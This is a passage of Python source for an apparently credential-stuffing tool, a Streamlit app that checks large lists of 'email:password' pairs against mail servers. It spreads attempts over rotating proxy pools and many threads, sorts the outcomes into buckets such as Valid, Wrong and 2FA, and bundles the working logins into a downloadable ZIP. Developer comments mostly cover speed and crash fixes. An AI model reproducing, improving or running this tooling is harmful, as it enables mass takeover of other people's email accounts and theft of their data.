                    ph.markdown(body, unsafe_allow_html=True)
                except Exception:
                    pass

        def check_task(line, pool=None):
            """One account. `pool` is this RUN's captured proxy list.

            v13.70 ISO-9: the pool used to be read from the module global
            active_proxy_pool, which any rerun in any session resets to []. The
            caller passes it now, so a rerun elsewhere cannot disarm a live run.
            """
            try:
                # Pin BEFORE anything reads live_cfg() or asks for a gate.
                seed_task_cfg(_run_cfg)
                _pin_gate_scope(_run_scope)
                _pool = active_proxy_pool if pool is None else pool
                if ":" not in line:
                    return {"line": f"{line} | Error: Invalid format", "status": FAILED,
                            "trace": ["Invalid format"]}
                email, password = line.split(":", 1)
                email, password = email.strip(), password.strip()
                reason = drop_before_check(email)
                if reason:
                    return {"line": f"{email}:{password} | {reason}", "email": email,
                            "password": password, "status": SKIP, "detail": reason,
                            "trace": [reason]}
                domain = email.split("@")[-1].lower()
                conf = get_servers(email)
                if not hasattr(thread_local, "state"):
                    thread_local.state = {}
                server, status, detail, px_used, trace = check_account_sync(
                    email, password, conf, domain, _pool, thread_local.state)
                return {"line": f"{email}:{password} | {detail}", "email": email,
                        "password": password, "status": status, "detail": detail,
                        "trace": trace}
            except Exception as ex:
                return {"line": f"{line} | Error: {ex}", "email": line, "password": "",
                        "status": FAILED, "detail": str(ex), "trace": [str(ex)]}
            finally:
                # v13.51: the whole per-thread dict was cleared, so the
                # `sticky_proxy` that PROXY_MODE = "sticky" stores in it died after
                # ONE account and sticky was never sticky. Everything else is
                # per-account and still goes; sticky is kept.
                if hasattr(thread_local, "state"):
                    try:
                        _keep = thread_local.state.get("sticky_proxy")
                        thread_local.state.clear()
                        if _keep:
                            thread_local.state["sticky_proxy"] = _keep
                    except Exception:
                        pass
                clear_task_cfg()
# @@END 105 RUN_TRIGGER_UI

# @@BLOCK 106 RUN_LOOP deps=009,014,083,105
        detected_stop_reason = "Interrupted / Stopped before completion"
        run_interrupted = False
        _orig_deadline = CFG.get("ACCOUNT_DEADLINE")
        _orig_retries = CFG.get("SAME_HOST_RETRIES")
        _orig_rot = CFG.get("MAX_ROTATIONS")
        # FIX CLOCK-SEED (v13.68) - THIS IS THE CRASH THAT LEFT checked=1/15.
        #
        # Block 105 seeds five clocks (_last_ui_ts, _last_df_ts, _last_ck_ts,
        # _last_clean_ts, _net_streak) but this block reads SEVEN. It also reads
        # _last_bucket_ts and _last_heavy_ck_ts, and both were only ever ASSIGNED
        # further down inside the loop - so on the first completed account they
        # were still unbound.
        #
        # The damage was two-stage:
        #   * _last_bucket_ts is read in the UI-tick block, which sits INSIDE the
        #     per-account try/except -> NameError swallowed, logged as
        #     "[EXCEPTION] name '_last_bucket_ts' is not defined", tick aborted.
        #   * _last_heavy_ck_ts is read in the CHECKPOINT, which sits OUTSIDE
        #     that try -> the NameError escaped to `except BaseException` and
        #     ENDED THE RUN on account 1, leaving checked=1/15 and 14 left.
        #
        # Both are seeded here, on the start path, before the try, in the same
        # scope the reads happen in. 0.0 is the correct sentinel and NOT "now":
        # it forces the first bucket render and the first heavy checkpoint
        # immediately, so unfinished_live.json exists after the first result
        # instead of thirty seconds later.
        _last_bucket_ts = 0.0
        _last_heavy_ck_ts = 0.0
        # FIX SURVIVE-1: the journal scope is captured here, beside the originals,
        # so the finally below can always close the right handles even if the try
        # throws before the journal is opened.
        _journal_scope = _gate_scope()
        try:
            # FIX ISO-5 (v13.53): the run counter is claimed HERE, as the first
            # statement inside the try, and released in the finally. Block 105 used
            # to claim it before the cold-pool wait, the tab build and the bucket
            # placeholders - all outside any finally - so any throw in that stretch
            # left runs_active permanently +1 and the deployment believed a run was
            # live forever.
            # FIX ISO-6 (v13.59): the count is PER USER now. One shared count meant
            # user B's page could not tell whether user A's run was live, so the
            # READY banner and the prober cadence were decided for the wrong person.
            # It is resolved through _user_state() rather than the bare _US alias,
            # because a prober thread in another tab rebinds _US.
            _us_run = _user_state()
            _us_run["runs_active"] = int(_us_run.get("runs_active", 0)) + 1
            STATE["runs_active"] = int(STATE.get("runs_active", 0)) + 1
            STATE["run_active"] = True
            str_lit.session_state["run_active"] = True
            # FIX SURVIVE-1 (v13.67): every bucket gets a live file from here, so a
            # teardown at ANY point leaves the run on disk and the reload restores
            # it. Before this, the twelve bucket files were written only by the
            # export block, which sits below this loop - so a teardown left nothing
            # but the valid list, which has its own incremental writer.
            live_journal_open(_run_stamp, _journal_scope)

            current_workers = CFG["MAX_WORKERS_START"]
            if CFG.get("DYNAMIC_WORKER_SCALING", False):
                # FIX SPEED-3: the small-queue branch CAPPED the count at 5, so a
                # 10-line resume ran 5 workers even when the slider said 50 - the
                # slider was ignored exactly where it looked most useful, and
                # raising it appeared to do nothing. Scaling may only ever RAISE
                # the count above what was asked, never clamp it below.
                if total_accs > 500:
                    current_workers = max(
                        CFG["MAX_WORKERS_START"],
                        min(100 if CFG.get("FAST_MODE", True) else 35,
                            CFG["MAX_WORKERS_START"] * 2))
                elif total_accs < 20:
                    current_workers = max(2, min(CFG["MAX_WORKERS_START"], total_accs))

            # FIX LAG-2: the metric cells are built ONCE, here. Rebuilding 14
            # st.columns inside every 0.12s tick was the single biggest per-tick
            # cost, and that cost grew with the result set - so it was at its
            # worst exactly when the queue was at its shortest.
            # FIX LAG-6: the labels are their own list. The first version paired
            # the placeholders with a list of INTEGERS but kept the old
            # `(_ml, _mv)` double-unpack, so every tick raised "cannot unpack
            # non-iterable int object" inside the per-account try/except. It was
            # swallowed, and it aborted the checkpoint, the progress bar and the
            # bucket render on every tick while looking like a harmless log line.
            _metric_labels = [
                "✅ Valid", "❌ Wrong", "🔑 AppPass/2FA",
                "🚪 Login Dropped", "🔌 Conn Failed", "🩹 Proxy Dead",
                "🕓 RETRY_LATER", "🚫 RBL", "📮 SMTP Failed",
                "⏭ Skipped", "❓ Unclassified", "📋 Checked",
                "📚 Queue",
            ]
            with report_metrics_placeholder.container():
                _metric_phs = [c.empty() for c in metric_grid(_metric_labels, per_row=3)]

            # FIX LAG-3: an explicit executor, not `with`. ThreadPoolExecutor's
            # __exit__ calls shutdown(wait=True), so a teardown mid-run blocked
            # until EVERY queued account finished before the page could come back.
            # v13.70 ISO-9: AND THE POOL IS CAPTURED HERE, ONCE. It is passed to
            # every task, so a rerun in another session - which resets the module
            # global active_proxy_pool to [] - can no longer disarm this run.
            _run_pool = list(active_proxy_pool)
            executor = ThreadPoolExecutor(max_workers=current_workers)
            try:
                future_to_line = {executor.submit(check_task, line, _run_pool): line
                                  for line in all_target_accounts}

                for index, future in enumerate(as_completed(future_to_line), 1):
                    checked_count += 1
                    # FIX LAG-4: the tail is the slowest work by construction -
                    # everything still queued has already exhausted most of its
                    # ladder. Once only one worker-cohort is left, strip the tail.
                    # FIX SPEED-9: capping ACCOUNT_DEADLINE alone did nothing,
                    # because the per-account work floor lifted it straight back
                    # up. The retries and the rotations are the other two pure
                    # tail costs, so they go to zero for the tail only and all
                    # three are restored in the finally.
                    #
                    # v13.66: IT BIT FROM ACCOUNT 1 ON EVERY SHORT QUEUE. The test
                    # is against the WORKER COUNT, so a 15-account list on 50
                    # workers satisfied it at once (14 <= 50) and the WHOLE run got
                    # a 30s deadline with retries and rotations zeroed - not just
                    # the last cohort. With auto-scaling ON the count can equal the
                    # queue length, so it fired every single time. The extra guard
                    # keeps the optimisation for what it was written for: the last
                    # cohort of a queue that actually has more than one cohort.
                    _tail_left = total_accs - checked_count
                    if (_tail_left and _tail_left <= current_workers
                            and total_accs > current_workers):
                        try:
                            CFG["ACCOUNT_DEADLINE"] = min(
                                int(CFG.get("ACCOUNT_DEADLINE", DEADLINE_NORMAL)), 30)
                            CFG["SAME_HOST_RETRIES"] = 0
                            CFG["MAX_ROTATIONS"] = 0
                        except Exception:
                            pass
                    try:
                        res = future.result(
                            timeout=max(30, int(CFG["ACCOUNT_DEADLINE"])) + WORKER_FUTURE_PAD)
                        if res:
                            st_val = res["status"]
                            em_val = res.get('email', '').strip().lower()

                            # Connection-loss evidence: consecutive transport-ish
                            # verdicts. One bad host is normal; eight in a row is
                            # not, so stamp it on the record while it is happening.
                            if st_val in (CONNECTION_FAILED, PROXY_UNHEALTHY,
                                          DNS_FAILED, RETRY):
                                _net_streak += 1
                                if _net_streak == NET_STREAK_TRIP:
                                    runstate.note(
                                        f"{_net_streak} consecutive transport failures "
                                        f"(last: {st_val}) - connection looks down")
                                    log_probe_event(
                                        f"run: {_net_streak} consecutive transport "
                                        f"failures ({st_val}) - connection looks down")
                            else:
                                _net_streak = 0

                            # FIX LAG-1: decide the UI tick BEFORE doing any list copies.
                            _now_ui = time.time()
                            _tick = (checked_count >= total_accs) or \
                                    ((_now_ui - _last_ui_ts) >= UI_MIN_INTERVAL)
                            _df_tick = ((checked_count >= total_accs)
                                        or ((_now_ui - _last_df_ts) >= REPORT_DF_MIN_INTERVAL))
                            # FIX DELTA-1 (v13.67): buckets redraw on their own,
                            # slower clock - they are the expensive part.
                            _bucket_tick = ((checked_count >= total_accs)
                                            or ((_now_ui - _last_bucket_ts)
                                                >= BUCKET_MIN_INTERVAL))

                            with session_state_lock:
                                if em_val:
                                    str_lit.session_state.checked_emails_set.add(em_val)
                                if st_val == VALID:
                                    if res["line"] not in str_lit.session_state.valid_results:
                                        str_lit.session_state.valid_results.append(res["line"])
                                        str_lit.session_state.run_valid_count += 1
                                    str_lit.session_state.clean_valid_count = \
                                        str_lit.session_state.run_valid_count
                                elif st_val == WRONG:
                                    str_lit.session_state.wrong_results.append(res["line"])
                                elif st_val == APP:
                                    str_lit.session_state.need_app_results.append(res["line"])
                                elif st_val == LOGIN_DROPPED:
                                    str_lit.session_state.login_drop_results.append(res["line"])
                                elif st_val == RETRY:
                                    str_lit.session_state.retry_results.append(res["line"])
                                elif st_val == RBL:
                                    str_lit.session_state.rbl_results.append(res["line"])
                                elif st_val == SMTP_FAILED:
                                    str_lit.session_state.smtp_results.append(res["line"])
                                elif st_val == DNS_FAILED:
                                    str_lit.session_state.dns_results.append(res["line"])
                                elif st_val == PROXY_UNHEALTHY:
                                    str_lit.session_state.proxy_results.append(res["line"])
                                elif st_val == SKIP:
                                    str_lit.session_state.skip_results.append(res["line"])
                                elif st_val == UNKNOWN:
                                    str_lit.session_state.unknown_results.append(res["line"])
                                else:
                                    str_lit.session_state.conn_results.append(res["line"])

                                # FIX SURVIVE-1 (v13.67): the result lands on disk
                                # HERE, not at export time.
                                _jtag = _BUCKET_TAG_BY_STATUS.get(st_val)
                                if _jtag:
                                    live_journal_append(_jtag, res["line"],
                                                        _journal_scope)

                                str_lit.session_state.log_lines.append(
                                    f"[{st_val.upper()}] {res.get('email', '')} -> "
                                    f"{res.get('detail', '')}")
                                # FIX LAG-7: O(1) trim. popleft() covers the deque;
                                # the pop(0) fallback covers a plain list, which is
                                # what "Free my RAM" leaves behind if it is pressed
                                # mid-run - the cap must not stop applying then.
                                if len(str_lit.session_state.log_lines) > log_cap:
                                    try:
                                        str_lit.session_state.log_lines.popleft()
                                    except AttributeError:
                                        str_lit.session_state.log_lines.pop(0)

                                trace_text = "\n  ↳ ".join(
                                    res.get("trace", ["No trace recorded"]))
                                cred_combo = (f"{res.get('email', '')}:{res.get('password', '')}"
                                              if res.get('password') else res.get('email', ''))
                                str_lit.session_state.report_entries.append({
                                    "Time": datetime.now().strftime("%H:%M:%S"),
                                    "Email:Password": cred_combo,
                                    "Status": st_val.upper(),
                                    "Under-The-Hood Background Trace":
                                        f"Result: {res.get('detail', '')}\n"
                                        f"Steps Executed:\n  ↳ {trace_text}",
                                })
                                if len(str_lit.session_state.report_entries) > REPORT_ENTRIES_MAX:
                                    try:
                                        str_lit.session_state.report_entries.popleft()
                                    except AttributeError:
                                        del str_lit.session_state.report_entries[
                                            :-REPORT_ENTRIES_MAX]

                                valid_len = len(str_lit.session_state.valid_results)
                                wrong_len = len(str_lit.session_state.wrong_results)
                                need_len = len(str_lit.session_state.need_app_results)
                                login_drop_len = len(str_lit.session_state.login_drop_results)
                                conn_len = len(str_lit.session_state.conn_results)
                                proxy_len = len(str_lit.session_state.proxy_results)
                                retry_len = len(str_lit.session_state.retry_results)
                                rbl_len = len(str_lit.session_state.rbl_results)
                                smtp_len = len(str_lit.session_state.smtp_results)
                                skip_len = len(str_lit.session_state.skip_results)
                                unknown_len = len(str_lit.session_state.unknown_results)
                                current_logs = (list(str_lit.session_state.log_lines)
                                                if _tick else [])
                                # FIX LAG-5: up to 2000 entries were copied on every
                                # tick; they are only needed when the table redraws.
                                current_reports = (list(str_lit.session_state.report_entries)
                                                   if _df_tick else [])
                                bucket_snapshot = ({
                                    "valid_results": list(str_lit.session_state.valid_results),
                                    "wrong_results": list(str_lit.session_state.wrong_results),
                                    "conn_results": list(str_lit.session_state.conn_results),
                                    "proxy_results": list(str_lit.session_state.proxy_results),
                                    "login_drop_results": list(str_lit.session_state.login_drop_results),
                                    "need_app_results": list(str_lit.session_state.need_app_results),
                                    "retry_results": list(str_lit.session_state.retry_results),
                                    "rbl_results": list(str_lit.session_state.rbl_results),
                                    "smtp_results": list(str_lit.session_state.smtp_results),
                                    "dns_results": list(str_lit.session_state.dns_results),
                                    "skip_results": list(str_lit.session_state.skip_results),
                                    "unknown_results": list(str_lit.session_state.unknown_results),
                                } if _bucket_tick else {})

                            if _tick:
                                _last_ui_ts = _now_ui
                                # FIX UI-GUARD (v13.69): THE REPAINT IS GUARDED ON
                                # ITS OWN NOW. Everything below draws into a delta
                                # the teardown may already have destroyed, and it
                                # used to sit directly in the per-account try - so a
                                # paint failure on account 7 was caught by the
                                # handler meant for the CHECK, was appended to
                                # conn_results as "[EXCEPTION] ...", and cost that
                                # account its metrics and its bucket repaint even
                                # though the result itself was fine. The result is
                                # already recorded and journalled above this line,
                                # so a repaint fault is now only a log line. Both
                                # stamps are set before the try so a broken paint
                                # backs off instead of retrying every account.
                                try:
                                    # FIX DELTA-1: the log tail is 150 lines, not 300,
                                    # and a torn-down delta can no longer kill the loop.
                                    try:
                                        if str_lit.session_state.get("colorize_logs", True):
                                            log_container.markdown(
                                                colorize_logs(current_logs[-150:]),
                                                unsafe_allow_html=True)
                                        else:
                                            log_container.code("\n".join(current_logs[-150:]),
                                                               language="text")
                                    except Exception:
                                        pass

                                    _vals = [valid_len, wrong_len, need_len, login_drop_len,
                                             conn_len, proxy_len, retry_len, rbl_len,
                                             smtp_len, skip_len, unknown_len,
                                             checked_count, total_accs]
                                    for _ph, _ml, _mv in zip(_metric_phs, _metric_labels, _vals):
                                        try:
                                            _ph.metric(_ml, _mv)
                                        except Exception:
                                            pass

                                    if _bucket_tick:
                                        _last_bucket_ts = _now_ui
                                        render_buckets(bucket_snapshot)

                                    if _df_tick:
                                        _last_df_ts = _now_ui
                                        report_log_container.dataframe(
                                            pd.DataFrame(current_reports[::-1]),
                                            width="stretch", height=320)
                                except Exception as _ui_err:
                                    log_probe_event(f"live repaint skipped: {_ui_err}")

                    except Exception as ex:
                        err_msg = f"[EXCEPTION] {str(ex)}"
                        with session_state_lock:
                            str_lit.session_state.conn_results.append(err_msg)
                            str_lit.session_state.log_lines.append(err_msg)
                            current_logs = list(str_lit.session_state.log_lines)
                        try:
                            if str_lit.session_state.get("colorize_logs", True):
                                log_container.markdown(colorize_logs(current_logs[-150:]),
                                                       unsafe_allow_html=True)
                            else:
                                log_container.code("\n".join(current_logs[-150:]),
                                                   language="text")
                        except Exception:
                            pass

                    # Checkpoint on TIME as well as on count. The counter alone
                    # meant a 47-account run never reached a checkpoint before a
                    # teardown: checked stayed 0, the heartbeat went stale and
                    # unfinished_live.json was never written, so Resume was empty
                    # and the stop had no reason.
                    _now_ck = time.time()
                    if ((checked_count % 100 == 0) or (checked_count == total_accs)
                            or (_now_ck - _last_ck_ts) >= CHECKPOINT_SECONDS):
                        _last_ck_ts = _now_ck
                        # FIX CK-GUARD (v13.68): THE WHOLE CHECKPOINT IS GUARDED
                        # NOW. It runs on the script thread and every part of it
                        # touches the disk, so one ENOSPC or one unreadable record
                        # used to end the run exactly the way the missing clock
                        # did. Both stamps are set BEFORE the try, so a failing
                        # checkpoint backs off instead of retrying every account.
                        try:
                            # Heartbeat first and cheap: this is what stops tick()
                            # from calling a healthy long run interrupted on the
                            # next load.
                            runstate.progress(checked_count, total_accs)
                            # FIX SURVIVE-2 (v13.67): THE HEAVY PART MOVED OFF THE
                            # 5s CLOCK. Rebuilding `left` is one str.split() per
                            # queued account - 120,056 of them on a real list - and
                            # save_unfinished() then writes a ~5 MB JSON of the
                            # whole remaining queue: twelve times a minute, on the
                            # script thread, for a file only the stop path ever
                            # reads. The heartbeat above keeps the watchdog honest;
                            # a queue snapshot every 30s is still far finer than
                            # any teardown.
                            if ((checked_count >= total_accs)
                                    or (_now_ck - _last_heavy_ck_ts) >= HEAVY_CHECKPOINT_SECONDS):
                                _last_heavy_ck_ts = _now_ck
                                with session_state_lock:
                                    done = set(str_lit.session_state.checked_emails_set)
                                    valids = list(str_lit.session_state.valid_results)
                                left = []
                                for raw in all_target_accounts:
                                    em = (raw.split(":", 1)[0].strip().lower()
                                          if ":" in raw else raw)
                                    if em not in done:
                                        left.append(raw)
                                if left:
                                    save_unfinished("In Progress (Running)", left,
                                                    checked_count, total_accs)
                                # FIX SPEED-4: clean_valid_accounts.txt is read and
                                # fully rewritten by _write_clean_valid(). Doing that
                                # on the 5s checkpoint put a whole-file read+write on
                                # the script thread twelve times a minute for no new
                                # information.
                                if ((checked_count >= total_accs)
                                        or ((_now_ck - _last_clean_ts) >= CLEAN_SYNC_SECONDS)):
                                    _last_clean_ts = _now_ck
                                    try:
                                        _write_clean_valid(
                                            f"# Live sync | this run valid {len(valids)}\n",
                                            valids)
                                    except Exception:
                                        pass
                        except Exception as _ck_err:
                            log_probe_event(f"checkpoint skipped: {_ck_err}")

                    if total_accs > 0:
                        pct = min(1.0, checked_count / total_accs)
                        try:
                            progress_bar.progress(
                                pct, text=f"Checking accounts [{engine_action_mode}]: "
                                          f"{checked_count}/{total_accs} ({int(pct * 100)}%)")
                        except Exception:
                            pass
                    with session_state_lock:
                        v_len = len(str_lit.session_state.valid_results)
                        w_len = len(str_lit.session_state.wrong_results)
                        rt_len = len(str_lit.session_state.retry_results)
                        px_len = len(str_lit.session_state.proxy_results)
                        ld_len = len(str_lit.session_state.login_drop_results)
                    try:
                        status_text.text(
                            f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | "
                            f"Wrong: {w_len} | Login Dropped: {ld_len} | Proxy Dead: {px_len} | "
                            f"RETRY_LATER: {rt_len}")
                    except Exception:
                        pass

            finally:
                executor.shutdown(wait=False)

        except MemoryError as me:
            run_interrupted = True
            detected_stop_reason = "Resource Exhaustion: RAM full / Out of Memory"
            runstate.note(detected_stop_reason)
            str_lit.error(f"⚠ Engine Stopped: RAM Full: {me}")
        except (socket.timeout, ConnectionError, ssl.SSLError) as net_err:
            run_interrupted = True
            detected_stop_reason = f"Network Connection Failure: {net_err}"
            runstate.note(detected_stop_reason)
            str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
        except (OSError, IOError) as oe:
            run_interrupted = True
            detected_stop_reason = ("Resource Exhaustion: Disk Space / ROM full"
                                    if getattr(oe, 'errno', 0) == 28
                                    else f"Filesystem / I/O Error: {oe}")
            runstate.note(detected_stop_reason)
            str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
        except BaseException as be:
            run_interrupted = True
            if isinstance(be, (SystemExit, KeyboardInterrupt)):
                # v13.53: NOT re-raised any more. `raise be` here skipped blocks 107
                # and 108 outright, so a shutdown wrote no result files and no
                # bundle while the run record had already been stamped - the one
                # case where the export matters most. The loop has already broken,
                # so carrying on costs about a second and saves the results.
                detected_stop_reason = "System Shutdown / Interruption"
                log_probe_event("run stopped by SystemExit/KeyboardInterrupt - "
                                "exporting what is already checked")
                str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason} - "
                              f"writing the results that are already checked.")
            else:
                _bn = type(be).__name__
                if _bn in ("RerunException", "StopException", "ScriptStopped"):
                    detected_stop_reason = "User Interruption: UI interaction (Streamlit rerun)"
                    log_probe_event("run stopped by a Streamlit RerunException/StopException")
                else:
                    be_str = str(be).lower()
                    if any(k in be_str for k in ["rerun", "stop", "scriptrunner", "websocket",
                                                 "closed", "connection lost"]):
                        detected_stop_reason = "User Interruption: UI interaction"
                    else:
                        detected_stop_reason = f"Unexpected Error / Interruption: {be}"
            runstate.note(detected_stop_reason)
        finally:
            # FIX SURVIVE-1 (v13.67): flush and close THIS run's bucket handles
            # before anything else can touch those files.
            live_journal_close(_journal_scope)
            # Restore the slider's own values so the sidebar does not report
            # unapplied settings after a run that used the tail caps.
            if _orig_deadline is not None:
                CFG["ACCOUNT_DEADLINE"] = _orig_deadline
            if _orig_retries is not None:
                CFG["SAME_HOST_RETRIES"] = _orig_retries
            if _orig_rot is not None:
                CFG["MAX_ROTATIONS"] = _orig_rot
            # FIX ISO-4 (v13.49): decrement the count and DERIVE the bool, so a
            # second user's run is not told the deployment went idle when this one
            # ends. max(0, ...) keeps a double release from going negative.
            # FIX ISO-6 (v13.59): the count is per user; the process counter is
            # only a mirror for anything that needs "any run anywhere".
            _us_run = _user_state()
            _us_run["runs_active"] = max(0, int(_us_run.get("runs_active", 0)) - 1)
            STATE["runs_active"] = max(0, int(STATE.get("runs_active", 0)) - 1)
            STATE["run_active"] = STATE["runs_active"] > 0
            str_lit.session_state["run_active"] = False
            # FIX FIN-GUARD (v13.68): A RAISE IN THIS finally SKIPPED BLOCKS 107
            # AND 108 ENTIRELY. Both sit AFTER the try/finally in the same branch,
            # so a disk error here meant no result files, no ZIP and no summary -
            # and a raise inside a finally also masks the exception that got us
            # here. The bookkeeping is guarded; the export is not optional.
            try:
                with session_state_lock:
                    done = set(str_lit.session_state.checked_emails_set)
                left = [raw for raw in all_target_accounts
                        if (raw.split(":", 1)[0].strip().lower()
                            if ":" in raw else raw) not in done]
                if checked_count >= total_accs and not run_interrupted:
                    # Clean completion: close the watchdog record, then drop the data.
                    runstate.finish()
                    clear_unfinished()
                elif left:
                    save_unfinished(detected_stop_reason, left, checked_count, total_accs)
            except Exception as _fin_err:
                log_probe_event(f"run record could not be finalised: {_fin_err}")

        end_dt = datetime.now()
        duration = end_dt - start_dt

        with session_state_lock:
            str_lit.session_state.run_completion_status = (
                "Successful" if (checked_count >= total_accs and not run_interrupted)
                else "Unfinished")
            str_lit.session_state.end_timestamp = end_dt.strftime("%Y-%m-%d %H:%M:%S")
            str_lit.session_state.total_duration = str(timedelta(seconds=int(duration.total_seconds())))
            valid_snapshot = list(str_lit.session_state.valid_results)
            wrong_snapshot = list(str_lit.session_state.wrong_results)
            need_snapshot = list(str_lit.session_state.need_app_results)
            login_drop_snapshot = list(str_lit.session_state.login_drop_results)
            conn_snapshot = list(str_lit.session_state.conn_results)
            proxy_snapshot = list(str_lit.session_state.proxy_results)
            retry_snapshot = list(str_lit.session_state.retry_results)
            rbl_snapshot = list(str_lit.session_state.rbl_results)
            smtp_snapshot = list(str_lit.session_state.smtp_results)
            dns_snapshot = list(str_lit.session_state.dns_results)
            skip_snapshot = list(str_lit.session_state.skip_results)
            unknown_snapshot = list(str_lit.session_state.unknown_results)

        invalidate_valid_caches()

        try:
            progress_bar.progress(1.0, text="Checking complete!")
            status_text.success(
                f"🎉 Check Complete! Started: {str_lit.session_state.start_timestamp} | "
                f"Ended: {str_lit.session_state.end_timestamp} | "
                f"Duration: {str_lit.session_state.total_duration}")
        except Exception:
            pass
# @@END 106 RUN_LOOP

# @@BLOCK 107 RUN_EXPORT deps=078,106
        try:
            # FIX SPEED-11: the bar hit 100% and then the page sat still while this
            # block wrote twelve files. Say so instead of freezing silently.
            try:
                progress_bar.progress(1.0, text="Writing result files and bundle...")
                status_text.text("Progress: complete - writing result files.")
            except Exception:
                pass

            # FIX SURVIVE-1 (v13.67): the journal already wrote these exact files
            # during the run, so the export must land on the SAME stamp. A fresh
            # stamp here would leave the live files orphaned and this export empty.
            live_journal_close(_journal_scope)
            stamp = _run_stamp
            valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
            wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
            need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
            failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
            proxy_path = os.path.join(CFG["RESULTS_DIR"], f"proxy_unhealthy_{stamp}.txt")
            login_drop_path = os.path.join(CFG["RESULTS_DIR"], f"login_dropped_{stamp}.txt")
            retry_path = os.path.join(CFG["RESULTS_DIR"], f"retry_later_{stamp}.txt")
            rbl_path = os.path.join(CFG["RESULTS_DIR"], f"rbl_blocked_{stamp}.txt")
            smtp_path = os.path.join(CFG["RESULTS_DIR"], f"smtp_failed_{stamp}.txt")
            dns_path = os.path.join(CFG["RESULTS_DIR"], f"dns_failed_{stamp}.txt")
            skip_path = os.path.join(CFG["RESULTS_DIR"], f"skipped_{stamp}.txt")
            unknown_path = os.path.join(CFG["RESULTS_DIR"], f"unclassified_{stamp}.txt")
            try:
                os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
            except OSError:
                pass

            hdr = (f"# Started: {str_lit.session_state.start_timestamp} | "
                   f"Ended: {str_lit.session_state.end_timestamp} | "
                   f"Duration: {str_lit.session_state.total_duration} | "
                   f"Protocols: {'+'.join(active_protocols())} | Build: {BUILD_TAG}\n")
            with file_write_lock:
                for path, snap in ((valid_path, valid_snapshot), (wrong_path, wrong_snapshot),
                                   (need_path, need_snapshot),
                                   (login_drop_path, login_drop_snapshot),
                                   (failed_path, conn_snapshot),
                                   (proxy_path, proxy_snapshot),
                                   (retry_path, retry_snapshot), (rbl_path, rbl_snapshot),
                                   (smtp_path, smtp_snapshot), (dns_path, dns_snapshot),
                                   (skip_path, skip_snapshot), (unknown_path, unknown_snapshot)):
                    with open(path, "w", encoding="utf-8") as f:
                        f.write(hdr)
                        f.write("\n".join(str(i) for i in snap) + ("\n" if snap else ""))

            # v13.51: _write_clean_valid returns (stored_total, this_run_count), so
            # the UI shows THIS run's valid count instead of the lifetime total.
            temp_stored, temp_run_count = _write_clean_valid(hdr, valid_snapshot)

            # v13.48: the bundle used to be written to the working directory as a
            # bare mail_results_<stamp>.zip, so two users finishing in the same
            # second overwrote each other's file. Prefix it with the session's own
            # user prefix - the same prefix every other per-user file carries.
            # FIX SPEED-6: it was then read straight back into memory, so the whole
            # archive was serialised to disk and parsed again before the page could
            # finish. It is built in memory now and never touches the disk.
            zip_output_name = f"{_cache_owner() or 'anon'}_mail_results_{stamp}.zip"
            import io as _io
            _zbuf = _io.BytesIO()
            with zipfile.ZipFile(_zbuf, "w", zipfile.ZIP_DEFLATED) as z:
                # v13.51: written from the in-memory snapshot, not re-read from the
                # growing on-disk merge file.
                z.writestr("valid_email_password.txt",
                           hdr + "\n".join(str(i) for i in valid_snapshot)
                           + ("\n" if valid_snapshot else ""))
                for _arc, _snap in (
                        (os.path.basename(wrong_path), wrong_snapshot),
                        (os.path.basename(need_path), need_snapshot),
                        (os.path.basename(login_drop_path), login_drop_snapshot),
                        (os.path.basename(failed_path), conn_snapshot),
                        (os.path.basename(proxy_path), proxy_snapshot),
                        (os.path.basename(retry_path), retry_snapshot),
                        (os.path.basename(rbl_path), rbl_snapshot),
                        (os.path.basename(smtp_path), smtp_snapshot),
                        (os.path.basename(dns_path), dns_snapshot),
                        (os.path.basename(skip_path), skip_snapshot),
                        (os.path.basename(unknown_path), unknown_snapshot)):
                    z.writestr(_arc, hdr + "\n".join(str(i) for i in _snap)
                               + ("\n" if _snap else ""))
            zip_bytes_data = _zbuf.getvalue()

            # v13.51: tell the screen the write finished, because block 108's
            # render is what the page sits on for the next while.
            try:
                status_text.text(f"Progress: complete - {temp_run_count} result(s) written. "
                                 f"Building the summary...")
            except Exception:
                pass

            with session_state_lock:
                str_lit.session_state.clean_valid_count = temp_stored
                str_lit.session_state.zip_name = zip_output_name
                str_lit.session_state.zip_bytes = zip_bytes_data
        except Exception as ex:
            str_lit.error(f"Error compiling results export files: {ex}")
# @@END 107 RUN_EXPORT

# @@BLOCK 108 RESULTS_SUMMARY deps=007,014,019,035,036,037,087,106
# v13.51: THE 98-SECOND FREEZE.  Measured from the logs: the loop ends, the
# page reports the run OK 98 seconds later.  Block 107 writes twelve small files
# and a twelve-entry in-memory zip in one or two seconds - the rest was THIS
# block, which built up to 480 separate st.code widgets (12 expanders x 40
# lines), a 2000-row dataframe and a full log re-render on every rerun, and
# called load_persistent_valid_results() inside its own `if` condition after
# invalidate_valid_caches() had just zeroed the cache.
#
# v13.52: the remaining cost was the report dataframe - up to 2000 rows, each
# carrying a multi-line trace string, handed to st.dataframe() in one call. That
# is a DOM payload measured in megabytes. The copy is now capped where it is
# TAKEN, so the dataframe call itself is unchanged, and the CSV / ZIP still
# carry every row. The block also WRITES to status_text, because until now
# nothing here touched it: the screen sat on block 107's "writing result files"
# line for the entire render, which is exactly what was reported as a hang.
_DF_TAIL = 1000

try:
    status_text.text("Progress: complete - building the results summary...")
except Exception:
    pass

_persisted_valid = load_persistent_valid_results()

if str_lit.session_state.engine_has_run or _persisted_valid:
    section_title("📊", "Live Results Summary & ZIP Archive",
                  "persisted results, downloadable bundle, full under-the-hood traces")

    with session_state_lock:
        status_label = ("🎉 Check Complete!"
                        if str_lit.session_state.run_completion_status == "Successful"
                        else "⚠️ Unfinished / Loaded from Disk")
        clean_count_val = str_lit.session_state.get("run_valid_count",
                                                    str_lit.session_state.clean_valid_count)
        wrong_len_val = len(str_lit.session_state.wrong_results)
        need_len_val = len(str_lit.session_state.need_app_results)
        login_drop_len_val = len(str_lit.session_state.login_drop_results)
        conn_len_val = len(str_lit.session_state.conn_results)
